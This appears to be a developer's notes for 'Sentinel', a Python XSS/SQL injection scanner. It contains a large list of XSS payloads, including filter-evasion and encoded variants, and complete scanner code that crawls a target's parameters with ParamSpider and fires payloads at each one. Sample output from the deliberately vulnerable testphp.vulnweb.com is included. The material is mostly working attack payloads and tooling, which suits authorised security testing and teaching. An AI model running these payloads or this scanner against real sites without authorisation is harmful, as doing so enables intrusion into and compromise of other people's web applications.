Banner :

   _____            __  _            __
  / ___/___  ____  / /_(_)___  ___  / /
  \__ \/ _ \/ __ \/ __/ / __ \/ _ \/ / 
 ___/ /  __/ / / / /_/ / / / /  __/ /  
/____/\___/_/ /_/\__/_/_/ /_/\___/_/   
                                   
   #XSS/SQL Vulnerability Scanner                       


----------------------------------------------------------------------------------------------------





payloads = ['" onmouseover=alert(1)>', '"><script>alert(1)</script>', '<svg/onload=alert(1)>', '<img src=x onerror=alert(1)>', '<image/src/onerror=prompt(8)>', '<img src=x onerror=alert(1);> ', '"onclick=prompt(8)><svg/onload=prompt(8)>"@x.y', '"><svg onload=alert(1)//', '<x contenteditable onblur=alert(1)>lose focus! ', '<x onclick=alert(1)>click this! ', '<x onmouseover=alert(1)>hover this!', '"><img src=1 onerror=alert(1)>.gif', '<a"/onclick=(confirm)()>Click Here!\n', 'Dec: <svg onload=prompt%26%230000000040document.domain)>\n', 'Hex: <svg onload=prompt%26%23x000000028;document.domain)>\n', 'xss\'"><iframe srcdoc=\'%26lt;script>;prompt`${document.domain}`%26lt;/script>\'>\n', '<a href="j&Tab;a&Tab;v&Tab;asc&NewLine;ri&Tab;pt&colon;&lpar;a&Tab;l&Tab;e&Tab;r&Tab;t&Tab;(document.domain)&rpar;">X</a>\n', '<--%253cimg%20onerror=alert(1)%20src=a%253e --!>\n', "<a+HREF='%26%237javascrip%26%239t:alert%26lpar;document.domain)'>\n", 'javascript:{ alert`0` }\n', '1\'"><img/src/onerror=.1|alert``>\n', "<img src=x onError=import('//1152848220/')>\n", '%2sscript%2ualert()%2s/script%2u\n', '<svg on onload=(alert)(document.domain)>\n', '<img ignored=() src=x onerror=prompt(1)>\n', '<svg onx=() onload=(confirm)(1)>\n', 'â€œ><img%20src=x%20onmouseover=prompt%26%2300000000000000000040;document.cookie%26%2300000000000000000041;\n', '<svg on =i onload=alert(domain) (working)\n', '<svg onx=() onload=window.alert?.()> (working)\n', 'test",prompt%0A/*HelloWorld*/(document.domain)\n', '"onx+%00+onpointerenter%3dalert(domain)+x"\n', '"><svg%20onload=alert%26%230000000040"1")>\n', '%27%09);%0d%0a%09%09[1].find(alert)//\n', '"><img src=1 onmouseleave=print()>\n', '<svg on onload=(alert)(document.domain)>\n', '<svg/on%20onload=alert(1)>\n', '<img/src=x onError="`${x}`;alert(`Ex.Mi`);">', '">%0D%0A%0D%0A<x \'="foo"><x foo=\'><img src=x onerror=javascript:alert(`cloudfrontbypass`)//\'>\n', '">\'><details/open/ontoggle=confirm(\'XSS\')>\n', "6'%22()%26%25%22%3E%3Csvg/onload=prompt(1)%3E/\n", '&quot;&gt;&lt;img src=x onerror=confirm(1);&gt;', '<svg/onload=alert(1)>', '<svg/onload=alert(1)>', "<x/onclick=globalThis&lsqb;'\\u0070r\\u006f'+'mpt']&lt;)>clickme\n", 'tarun"><x/onafterscriptexecute=confirm%26lpar;)//\n', '<a/href="j%0A%0Davascript:{var{3:s,2:h,5:a,0:v,4:n,1:e}=\'earltv\'}[self][0][v+a+e+s](e+s+v+h+n)(/infected/.source)" />click  \n', '<details/open/ontoggle="self[\'wind\'%2b\'ow\'][\'one\'%2b\'rror\']=self[\'wind\'%2b\'ow\'][\'ale\'%2b\'rt\'];throw/**/self[\'doc\'%2b\'ument\'][\'domain\'];"> \n', '<svg onload\\r\\n=$.globalEval("al"+"ert()");>\n', '<bleh/onclick=top[/al/.source+/ert/.source]&Tab;``>click Pinaki \n', '<sVg OnPointerEnter="location=`javas`+`cript:ale`+`rt%2`+`81%2`+`9`;//</div"> \n', '<a/href="j%0A%0Davascript:{var{3:s,2:h,5:a,0:v,4:n,1:e}=\'test\'}[self][0][v+a+e+s](e+s+v+h+n)(/infected/.source)" />tap', '" onload=prompt(1)>']




----------------------------------------------------------------------------------------------------------




------------------------------------------------------------------------------------------------------------------


<script>alert('XSS')</script>
<scr<script>ipt>alert('XSS')</scr<script>ipt>
"><script>alert('XSS')</script>
"><script>alert(String.fromCharCode(88,83,83))</script>
<script>\u0061lert('22')</script>
<script>eval('\x61lert(\'33\')')</script>
<script>eval(8680439..toString(30))(983801..toString(36))</script> //parseInt("confirm",30) == 8680439 && 8680439..toString(30) == "confirm"
<object/data="jav&#x61;sc&#x72;ipt&#x3a;al&#x65;rt&#x28;23&#x29;">
<img src=x onerror=alert('XSS');>
<img src=x onerror=alert('XSS')//
<img src=x onerror=alert(String.fromCharCode(88,83,83));>
<img src=x oneonerrorrror=alert(String.fromCharCode(88,83,83));>
<img src=x:alert(alt) onerror=eval(src) alt=xss>
"><img src=x onerror=alert('XSS');>
"><img src=x onerror=alert(String.fromCharCode(88,83,83));>
<><img src=1 onerror=alert(1)>
<svgonload=alert(1)>
<svg/onload=alert('XSS')>
<svg onload=alert(1)//
<svg/onload=alert(String.fromCharCode(88,83,83))>
<svg id=alert(1) onload=eval(id)>
"><svg/onload=alert(String.fromCharCode(88,83,83))>
"><svg/onload=alert(/XSS/)
<svg><script href=data:,alert(1) />(`Firefox` is the only browser which allows self closing script)
<svg><script>alert('33')
<svg><script>alert&lpar;'33'&rpar;
<div onpointerover="alert(45)">MOVE HERE</div>
<div onpointerdown="alert(45)">MOVE HERE</div>
<div onpointerenter="alert(45)">MOVE HERE</div>
<div onpointerleave="alert(45)">MOVE HERE</div>
<div onpointermove="alert(45)">MOVE HERE</div>
<div onpointerout="alert(45)">MOVE HERE</div>
<div onpointerup="alert(45)">MOVE HERE</div>





-----------------------------------------------------------------------------------------------------------

xss.py: COMPLETE

import subprocess
import requests
import argparse
from concurrent.futures import ThreadPoolExecutor
from colorama import Fore
from threading import Lock

print(Fore.LIGHTBLUE_EX + """
   _____            __               __
  / ___/___  ____  / /_(_)___  ___  / /
  \__ \/ _ \/ __ \/ __/ / __ \/ _ \/ / 
 ___/ /  __/ / / / /_/ / / / /  __/ /  
/____/\___/_/ /_/\__/_/_/ /_/\___/_/   
                                   
   #XSS/SQL Vulnerability Scanner                       
               """ + Fore.WHITE)

# Set to store processed URLs
processed_urls = set()

# Lock to ensure thread-safe access to the set
url_lock = Lock()

# Function to run ParamSpider and get the parameters
def run_paramspider(url):
    try:
        subprocess.run(['paramspider', '-d', url], check=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    except subprocess.CalledProcessError as e:
        print(f"Error running ParamSpider: {e}")

# Function to read payloads from xss_payloads.txt
def read_payloads():
    with open('xss_payloads.txt', 'r') as file:
        payloads = [line.strip() for line in file if line.strip()]
    return payloads

# Function to perform XSS scanning on a single URL with a payload
def xss_scan_single(url, payload):
    try:
        # Replace "FUZZ" with the payload in the URL
        url_with_payload = url.replace('FUZZ', payload)

        # Ensure the URL has a scheme (http or https)
        if not url_with_payload.startswith("http://") and not url_with_payload.startswith("https://"):
            url_with_payload = "http://" + url_with_payload
        
        # Extract the base URL without parameters
        base_url = url.split('?')[0]

        # Check if base URL has already been scanned
        with url_lock:
            if base_url in processed_urls:
                return None

            # Mark base URL as processed
            processed_urls.add(base_url)
        
        # Send a request and check for payload in the response
        print(Fore.LIGHTWHITE_EX + f"[+] Testing {url_with_payload}")
        response = requests.get(url_with_payload)
        
        # Print the vulnerable URLs in red
        if payload in response.text:
            print(Fore.RED + f"[+] Vulnerable: {url_with_payload}")
            return f"XSS Vulnerable: {url_with_payload}"
    except Exception as e:
        print(f"Error scanning {url}: {e}")
    return None

# Function to clear processed URLs set
def clear_processed_urls():
    with url_lock:
        processed_urls.clear()

# Function to perform XSS scanning on multiple URLs with payloads using threading
def xss_scan(url, payloads):
    results = []
    
    # Read parameters from params.txt
    params_file = f"results/{url}.txt"
    with open(params_file, 'r') as f:
        params_urls = f.read().splitlines()

    # Use ThreadPoolExecutor to parallelize the scanning process
    with ThreadPoolExecutor(max_workers=10) as executor:
        # List comprehension to generate a list of futures
        futures = [executor.submit(xss_scan_single, url, payload) for url in params_urls for payload in payloads]

        # Wait for all futures to complete
        for future in futures:
            result = future.result()
            if result:
                results.append(result)

    # Write results to report.txt
    with open('report.txt', 'a') as report_file:
        for result in results:
            report_file.write(result + '\n')
        print(Fore.LIGHTGREEN_EX + "[+] Results saved to report.txt")

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="XSS/SQL Vulnerability Scanner")
    parser.add_argument("-u", "--url", required=True, help="Target URL")
    args = parser.parse_args()

    # Clear processed URLs set before starting a new scan
    clear_processed_urls()

    # Run ParamSpider
    run_paramspider(args.url)

    # Read payloads from xss_payloads.txt
    payloads = read_payloads()

    # Perform XSS scan
    xss_scan(args.url, payloads)


-----------------------------------------------------------------------------------------------------------------
sqli.py: COMPLETE

import subprocess
import requests
import argparse
import re
from concurrent.futures import ThreadPoolExecutor
from threading import Lock
from colorama import Fore

print(Fore.LIGHTBLUE_EX + """
   _____            __               __
  / ___/___  ____  / /_(_)___  ___  / /
  \__ \/ _ \/ __ \/ __/ / __ \/ _ \/ / 
 ___/ /  __/ / / / /_/ / / / /  __/ /  
/____/\___/_/ /_/\__/_/_/ /_/\___/_/   
                                   
   #XSS/SQL Vulnerability Scanner                       
               """ + Fore.WHITE)

DBMS_ERRORS = {
    "MySQL": (r"SQL syntax.*MySQL", r"Warning.*mysql_.*", r"valid MySQL result", r"MySqlClient\."),
    "PostgreSQL": (r"PostgreSQL.*ERROR", r"Warning.*\Wpg_.*", r"valid PostgreSQL result", r"Npgsql\."),
    "Microsoft SQL Server": (r"Driver.* SQL[\-\_\ ]*Server", r"OLE DB.* SQL Server", r"(\W|\A)SQL Server.*Driver", r"Warning.*mssql_.*", r"(\W|\A)SQL Server.*[0-9a-fA-F]{8}", r"(?s)Exception.*\WSystem\.Data\.SqlClient\.", r"(?s)Exception.*\WRoadhouse\.Cms\."),
    "Microsoft Access": (r"Microsoft Access Driver", r"JET Database Engine", r"Access Database Engine"),
    "Oracle": (r"\bORA-[0-9][0-9][0-9][0-9]", r"Oracle error", r"Oracle.*Driver", r"Warning.*\Woci_.*", r"Warning.*\Wora_.*"),
    "IBM DB2": (r"CLI Driver.*DB2", r"DB2 SQL error", r"\bdb2_\w+\("),
    "SQLite": (r"SQLite/JDBCDriver", r"SQLite.Exception", r"System.Data.SQLite.SQLiteException", r"Warning.*sqlite_.*", r"Warning.*SQLite3::", r"\[SQLITE_ERROR\]"),
    "Sybase": (r"(?i)Warning.*sybase.*", r"Sybase message", r"Sybase.*Server message.*"),
}

# Global set to store processed URLs
processed_urls = set()

# Lock to ensure thread-safe access to the set
url_lock = Lock()

# Function to run ParamSpider and get the parameters
def run_paramspider(url):
    try:
        subprocess.run(['paramspider', '-d', url], check=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    except subprocess.CalledProcessError as e:
        print(f"Error running ParamSpider: {e}")

# Function to read payloads from sql_payloads.txt
def read_payloads():
    with open('sql_payloads.txt', 'r') as file:
        payloads = [line.strip() for line in file if line.strip()]
    return payloads

# Function to detect DBMS for a given URL with payload
def detect_dbms(url_with_payload):
    try:
        # Send a request and check for payload in the response
        response = requests.get(url_with_payload, timeout=5)

        # Check for each DBMS error pattern
        for dbms, patterns in DBMS_ERRORS.items():
            if any(re.search(pattern, response.text) for pattern in patterns):
                return dbms

    except requests.RequestException as e:
        print(f"Error testing {url_with_payload}: {e}")

    return None

# Function to perform SQL scanning on a single URL with a payload
def sql_scan_single(url, payloads):
    try:
        with url_lock:
            # Check if the URL has already been processed, if yes, skip
            if url in processed_urls:
                return None

            # Mark the URL as processed to avoid duplicate scans
            processed_urls.add(url)

        # Flag to keep track of whether a vulnerability has been found for this URL
        vulnerability_found = False

        # Iterate over payloads only if vulnerability hasn't been found
        for payload in payloads:
            if not vulnerability_found:
                # Replace "FUZZ" with the payload in the URL
                url_with_payload = url.replace('FUZZ', payload)

                # Send a request and check for payload in the response
                print(Fore.LIGHTWHITE_EX + f"[+] Testing {url_with_payload}")
                response = requests.get(url_with_payload, timeout=5)

                # Check for each DBMS error pattern
                for dbms, patterns in DBMS_ERRORS.items():
                    if any(re.search(pattern, response.text) for pattern in patterns):
                        print(Fore.RED + f"[+] Vulnerable: {url_with_payload}")

                        # Set the flag to True once a vulnerability is found
                        vulnerability_found = True

        # Return the result for saving in report.txt
        if vulnerability_found:
            return f"SQL Vulnerable: {url_with_payload}"
        else:
            return None

    except requests.RequestException as e:
        print(f"Error testing {url}: {e}")
        return None

# Function to clear processed URLs set
def clear_processed_urls():
    with url_lock:
        processed_urls.clear() 

# Function to perform SQL scanning on multiple URLs with payloads using threading
def sql_scan(url, payloads):
    results = []

    # Read parameters from params.txt
    params_file = f"results/{url}.txt"
    with open(params_file, 'r') as f:
        params_urls = f.read().splitlines()

    # Detect DBMS for the URL
    dbms_result = detect_dbms(params_urls[0])  # Detect DBMS for the first URL

    # Print DBMS result
    if dbms_result:
        print(Fore.LIGHTGREEN_EX + f"[+] DBMS Detected: {dbms_result}")

        # Write the detected DBMS to report.txt
        with open('report.txt', 'a') as report_file:
            report_file.write(f"DBMS Detected: {dbms_result}\n")

    # Use ThreadPoolExecutor to parallelize the scanning process
    with ThreadPoolExecutor(max_workers=10) as executor:
        # List comprehension to generate a list of futures
        futures = [executor.submit(sql_scan_single, param_url, payloads) for param_url in params_urls for payload in payloads]

        # Wait for all futures to complete
        for future in futures:
            result = future.result()
            if result:
                results.append(result)

    # Write results to report.txt
    with open('report.txt', 'a') as report_file:
        for result in results:
            report_file.write(result + '\n')
        print(Fore.LIGHTGREEN_EX + "[+] Results saved to report.txt")

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="XSS/SQL Vulnerability Scanner")
    parser.add_argument("-u", "--url", required=True, help="Target URL")
    args = parser.parse_args()

    # Clear processed URLs set before starting a new scan
    clear_processed_urls()

    # Run ParamSpider
    run_paramspider(args.url)

    # Read payloads from sql_payloads.txt
    payloads = read_payloads()

    # Perform SQL scan
    sql_scan(args.url, payloads)

-------------------------------------------------------------------------------------------------------------------------------------------------------------

    


######
######
######

ORIGINAL WORKING CODE :

sentinel.py:

import subprocess
import requests
import argparse
import re
from xss import start_xss_scan
from sqli import start_sqli_scan
from concurrent.futures import ThreadPoolExecutor
from threading import Lock
from colorama import Fore

print(Fore.LIGHTBLUE_EX + """
   _____            __               __
  / ___/___  ____  / /_(_)___  ___  / /
  \__ \/ _ \/ __ \/ __/ / __ \/ _ \/ / 
 ___/ /  __/ / / / /_/ / / / /  __/ /  
/____/\___/_/ /_/\__/_/_/ /_/\___/_/   
                                   
   #XSS/SQL Vulnerability Scanner                       
               """ + Fore.WHITE)

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="XSS/SQL Vulnerability Scanner")
    parser.add_argument("-u", "--url", required=True, help="Target URL")
    parser.add_argument("--xss", action="store_true", help="Scan only for XSS vulnerabilities")
    parser.add_argument("--sql", action="store_true", help="Scan only for SQL vulnerabilities")
    args = parser.parse_args()

    if args.xss:
        start_xss_scan(args.url)
    elif args.sql:
        start_sqli_scan(args.url)
    else:
        # Run both scanners if no specific scan flags are mentioned
        start_xss_scan(args.url)
        start_sqli_scan(args.url)

___________________________________________________________________________________________________________

xss.py:

import subprocess
import requests
import argparse
from concurrent.futures import ThreadPoolExecutor
from colorama import Fore
from threading import Lock

# Set to store processed URLs
processed_urls = set()

# Lock to ensure thread-safe access to the set
url_lock = Lock()

# Function to run ParamSpider and get the parameters
def run_paramspider(url):
    try:
        subprocess.run(['paramspider', '-d', url], check=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    except subprocess.CalledProcessError as e:
        print(f"Error running ParamSpider: {e}")

# Function to read payloads from xss_payloads.txt
def read_payloads():
    with open('xss_payloads.txt', 'r') as file:
        payloads = [line.strip() for line in file if line.strip()]
    return payloads

# Function to perform XSS scanning on a single URL with a payload
def xss_scan_single(url, payload):
    try:
        # Replace "FUZZ" with the payload in the URL
        url_with_payload = url.replace('FUZZ', payload)

        # Ensure the URL has a scheme (http or https)
        if not url_with_payload.startswith("http://") and not url_with_payload.startswith("https://"):
            url_with_payload = "http://" + url_with_payload
        
        # Extract the base URL without parameters
        base_url = url.split('?')[0]

        # Check if base URL has already been scanned
        with url_lock:
            if base_url in processed_urls:
                return None

            # Mark base URL as processed
            processed_urls.add(base_url)
        
        # Send a request and check for payload in the response
        print(Fore.LIGHTWHITE_EX + f"[+] Testing {url_with_payload}")
        response = requests.get(url_with_payload)
        
        # Print the vulnerable URLs in red
        if payload in response.text:
            print(Fore.RED + f"[+] Vulnerable: {url_with_payload}")
            return f"XSS Vulnerable: {url_with_payload}"
    except Exception as e:
        print(f"Error scanning {url}: {e}")
    return None

# Function to clear processed URLs set
def clear_processed_urls():
    with url_lock:
        processed_urls.clear()

# Function to perform XSS scanning on multiple URLs with payloads using threading
def xss_scan(url, payloads):
    results = []
    
    # Read parameters from params.txt
    params_file = f"results/{url}.txt"
    with open(params_file, 'r') as f:
        params_urls = f.read().splitlines()

    # Use ThreadPoolExecutor to parallelize the scanning process
    with ThreadPoolExecutor(max_workers=10) as executor:
        # List comprehension to generate a list of futures
        futures = [executor.submit(xss_scan_single, url, payload) for url in params_urls for payload in payloads]

        # Wait for all futures to complete
        for future in futures:
            result = future.result()
            if result:
                results.append(result)

    # Write results to report.txt
    with open('report.txt', 'a') as report_file:
        for result in results:
            report_file.write(result + '\n')
        print(Fore.LIGHTGREEN_EX + "[+] Results saved to report.txt")

# This function takes a URL as an argument and initiates the XSS scan
def start_xss_scan(url):
    # Clear processed URLs set before starting a new scan
    clear_processed_urls()

    # Run ParamSpider
    run_paramspider(url)

    # Read payloads from xss_payloads.txt
    payloads = read_payloads()

    # Perform XSS scan
    xss_scan(url, payloads)

_________________________________________________________________________________________________________________

sqli.py:

import subprocess
import requests
import argparse
import re
from concurrent.futures import ThreadPoolExecutor
from threading import Lock
from colorama import Fore

DBMS_ERRORS = {
    "MySQL": (r"SQL syntax.*MySQL", r"Warning.*mysql_.*", r"valid MySQL result", r"MySqlClient\."),
    "PostgreSQL": (r"PostgreSQL.*ERROR", r"Warning.*\Wpg_.*", r"valid PostgreSQL result", r"Npgsql\."),
    "Microsoft SQL Server": (r"Driver.* SQL[\-\_\ ]*Server", r"OLE DB.* SQL Server", r"(\W|\A)SQL Server.*Driver", r"Warning.*mssql_.*", r"(\W|\A)SQL Server.*[0-9a-fA-F]{8}", r"(?s)Exception.*\WSystem\.Data\.SqlClient\.", r"(?s)Exception.*\WRoadhouse\.Cms\."),
    "Microsoft Access": (r"Microsoft Access Driver", r"JET Database Engine", r"Access Database Engine"),
    "Oracle": (r"\bORA-[0-9][0-9][0-9][0-9]", r"Oracle error", r"Oracle.*Driver", r"Warning.*\Woci_.*", r"Warning.*\Wora_.*"),
    "IBM DB2": (r"CLI Driver.*DB2", r"DB2 SQL error", r"\bdb2_\w+\("),
    "SQLite": (r"SQLite/JDBCDriver", r"SQLite.Exception", r"System.Data.SQLite.SQLiteException", r"Warning.*sqlite_.*", r"Warning.*SQLite3::", r"\[SQLITE_ERROR\]"),
    "Sybase": (r"(?i)Warning.*sybase.*", r"Sybase message", r"Sybase.*Server message.*"),
}

# Global set to store processed URLs
processed_urls = set()

# Lock to ensure thread-safe access to the set
url_lock = Lock()

# Function to run ParamSpider and get the parameters
def run_paramspider(url):
    try:
        subprocess.run(['paramspider', '-d', url], check=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    except subprocess.CalledProcessError as e:
        print(f"Error running ParamSpider: {e}")

# Function to read payloads from sql_payloads.txt
def read_payloads():
    with open('sql_payloads.txt', 'r') as file:
        payloads = [line.strip() for line in file if line.strip()]
    return payloads

# Function to detect DBMS for a given URL with payload
def detect_dbms(url_with_payload):
    try:
        # Send a request and check for payload in the response
        response = requests.get(url_with_payload, timeout=5)

        # Check for each DBMS error pattern
        for dbms, patterns in DBMS_ERRORS.items():
            if any(re.search(pattern, response.text) for pattern in patterns):
                return dbms, None

    except requests.RequestException as e:
        return None, f"Error testing {url_with_payload}: {e}"

    return None, None

# Function to perform SQL scanning on a single URL with a payload
def sql_scan_single(url, payloads):
    try:
        with url_lock:
            # Check if the URL has already been processed, if yes, skip
            if url in processed_urls:
                return None

            # Mark the URL as processed to avoid duplicate scans
            processed_urls.add(url)

        # Flag to keep track of whether a vulnerability has been found for this URL
        vulnerability_found = False

        # Iterate over payloads only if vulnerability hasn't been found
        for payload in payloads:
            if not vulnerability_found:
                # Replace "FUZZ" with the payload in the URL
                url_with_payload = url.replace('FUZZ', payload)

                # Send a request and check for payload in the response
                print(Fore.LIGHTWHITE_EX + f"[+] Testing {url_with_payload}")
                response = requests.get(url_with_payload, timeout=5)

                # Check for each DBMS error pattern
                for dbms, patterns in DBMS_ERRORS.items():
                    if any(re.search(pattern, response.text) for pattern in patterns):
                        print(Fore.RED + f"[+] Vulnerable: {url_with_payload}")

                        # Set the flag to True once a vulnerability is found
                        vulnerability_found = True

        # Return the result for saving in report.txt
        if vulnerability_found:
            return f"SQL Vulnerable: {url_with_payload}"
        else:
            return None

    except requests.RequestException as e:
        print(f"Error testing {url}: {e}")
        return None

# Function to clear processed URLs set
def clear_processed_urls():
    with url_lock:
        processed_urls.clear() 

# Function to perform SQL scanning on multiple URLs with payloads using threading
def sql_scan(url, payloads):
    results = []

    # Read parameters from params.txt
    params_file = f"results/{url}.txt"
    with open(params_file, 'r') as f:
        params_urls = f.read().splitlines()

    # Detect DBMS for the URL
    dbms_result, dbms_error = detect_dbms(params_urls[0])  # Detect DBMS for the first URL

    # Print DBMS result or error
    if dbms_result:
        print(Fore.LIGHTGREEN_EX + f"[+] DBMS Detected: {dbms_result}")

        # Write the detected DBMS to report.txt
        with open('report.txt', 'a') as report_file:
            report_file.write(f"DBMS Detected: {dbms_result}\n")
    elif dbms_error:
        print(Fore.LIGHTRED_EX + f"Error: {dbms_error}")

    # Use ThreadPoolExecutor to parallelize the scanning process
    with ThreadPoolExecutor(max_workers=10) as executor:
        # List comprehension to generate a list of futures
        futures = [executor.submit(sql_scan_single, param_url, payloads) for param_url in params_urls for payload in payloads]

        # Wait for all futures to complete
        for future in futures:
            result = future.result()
            if result:
                results.append(result)

    # Write results to report.txt
    with open('report.txt', 'a') as report_file:
        for result in results:
            report_file.write(result + '\n')
        print(Fore.LIGHTGREEN_EX + "[+] Results saved to report.txt")

# This function takes a URL as an argument and initiates the SQL scan
def start_sqli_scan(url):
    # Clear processed URLs set before starting a new scan
    clear_processed_urls()

    # Run ParamSpider
    run_paramspider(url)

    # Read payloads from sql_payloads.txt
    payloads = read_payloads()

    # Perform SQL scan
    sql_scan(url, payloads)

___________________________________________________________________________________________________________

output:

XSS Vulnerable: http://testphp.vulnweb.com/hpp/params.php?p=<script>alert('XSS')</script>
XSS Vulnerable: http://testphp.vulnweb.com/hpp/index.php?pp=<script>alert('XSS')</script>
XSS Vulnerable: http://testphp.vulnweb.com/listproducts.php?artist=<script>alert('XSS')</script>&amp%3Basdf=<script>alert('XSS')</script>&amp%3Bcat=<script>alert('XSS')</script>
XSS Vulnerable: http://testphp.vulnweb.com/showimage.php?file=<script>alert('XSS')</script>&size=<script>alert('XSS')</script>
XSS Vulnerable: http://testphp.vulnweb.com/hpp/?pp=<script>alert('XSS')</script>
DBMS Detected: MySQL
SQL Vulnerable: http://testphp.vulnweb.com/listproducts.php?id=' OR '1'='1' --
SQL Vulnerable: http://testphp.vulnweb.com/Mod_Rewrite_Shop/buy.php?id=' OR '1'='1' --
SQL Vulnerable: http://testphp.vulnweb.com/bxss/vuln.php?id=' OR '1'='1' --
SQL Vulnerable: http://testphp.vulnweb.com/listproducts.php?artist=' OR '1'='1' --
SQL Vulnerable: http://testphp.vulnweb.com/search.php?test=' OR '1'='1' --
SQL Vulnerable: http://testphp.vulnweb.com/listproducts.php?artist=' OR '1'='1' --&amp%3Basdf=' OR '1'='1' --&amp%3Bcat=' OR '1'='1' --
SQL Vulnerable: http://testphp.vulnweb.com/product.php?pic=' OR '1'='1' --
SQL Vulnerable: http://testphp.vulnweb.com/Mod_Rewrite_Shop/details.php?id=' OR '1'='1' --
SQL Vulnerable: http://testphp.vulnweb.com/artists.php?artist=' OR '1'='1' --
SQL Vulnerable: http://testphp.vulnweb.com/AJAX/infoartist.php?id=' OR '1'='1' --
SQL Vulnerable: http://testphp.vulnweb.com/AJAX/infoartist.php?id=' OR '1'='1' --&YVeN=' OR '1'='1' --
SQL Vulnerable: http://testphp.vulnweb.com/AJAX/infoartist.php?id=' OR '1'='1' --&DUMM=' OR '1'='1' --
SQL Vulnerable: http://testphp.vulnweb.com/listproducts.php?artist=' OR '1'='1' --&asdf=' OR '1'='1' --&cat=' OR '1'='1' --
SQL Vulnerable: http://testphp.vulnweb.com/artists.php?+artist=' OR '1'='1' --
SQL Vulnerable: http://testphp.vulnweb.com/listproducts.php?cat=' OR '1'='1' --
SQL Vulnerable: http://testphp.vulnweb.com/product.php?pic=' OR '1'='1' --&hkNi=' OR '1'='1' --
SQL Vulnerable: http://testphp.vulnweb.com/Mod_Rewrite_Shop/rate.php?id=' OR '1'='1' --
SQL Vulnerable: http://testphp.vulnweb.com/AJAX/infoartist.php?id=' OR '1'='1' --&fYij=' OR '1'='1' --
SQL Vulnerable: http://testphp.vulnweb.com/search.php?test=' OR '1'='1' --&cat=' OR '1'='1' --&ppl=' OR '1'='1' --
SQL Vulnerable: http://testphp.vulnweb.com/AJAX/infocateg.php?id=' OR '1'='1' --
SQL Vulnerable: http://testphp.vulnweb.com/listproducts.php?cat=' OR '1'='1' --&zfdfasdf=' OR '1'='1' --

_______________________________________________________________________________________________________________________

